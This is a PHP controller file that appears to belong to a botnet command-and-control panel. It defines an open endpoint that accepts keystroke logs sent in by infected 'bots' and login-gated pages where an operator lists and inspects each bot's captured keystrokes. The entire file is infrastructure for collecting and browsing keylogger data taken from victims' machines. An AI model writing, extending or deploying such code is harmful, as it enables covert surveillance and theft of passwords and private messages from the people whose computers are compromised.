<?php
include_once("../Model/Bean/Keylogger.php");
include_once("../Model/BO/BO_Keylogger.php");
include_once("../Model/Bean/Bot.php");
include_once("../Model/BO/BO_Bot.php");
include_once("../utils/checkServerOn.php");

class C_Keylogger
{
    public function addKeylogger()
    {
        $boKeylogger = new BO_Keylogger();
        $idbot = $_REQUEST["idbot"];
        $detail = $_REQUEST["detail"];
        $content = $_REQUEST["content"];
        $boKeylogger->addKeylogger($idbot, $detail, $content);
    }
    public function view()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $id = $_REQUEST["ID"];
            $boKeylogger = new BO_Keylogger();
            $count = $boKeylogger->getCountListKeylogger($id);


            if (!isset($_REQUEST["page"]) || $_REQUEST["page"] == 0) {
                $listKeylogger = $boKeylogger->getListKeylogger($id,0);
            } else {
                $listKeylogger = $boKeylogger->getListKeylogger($id, $_REQUEST["page"]);
            }
          
            include_once("../View/viewKeylogger.php");
        } else {
            include_once('../View/noLogin.php');
        }
    }
    public function keyloggerDetail()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $idKeylogger = $_REQUEST["IdKeylogger"];
            $idBot = $_REQUEST["IdBot"];
            $boKeylogger = new BO_Keylogger();
            $boBot = new BO_Bot();
            $keyloggerDetail = $boKeylogger->getKeyloggerDetail($idKeylogger);
            $bot = $boBot->getBotDetail($idBot);
            include_once("../View/viewKeyloggerDetail.php");
        } else {
            include_once('../View/noLogin.php');
        }
    }
}
$C_Keylogger = new C_Keylogger();
if (isset($_REQUEST["opt"])) {
    $option = $_REQUEST["opt"];
    if ($option == "add") {
        $C_Keylogger->addKeylogger();
    } else if ($option == "view") {
        $C_Keylogger->view();
    } else if ($option == "detail") {
        $C_Keylogger->keyloggerDetail();
    }
}
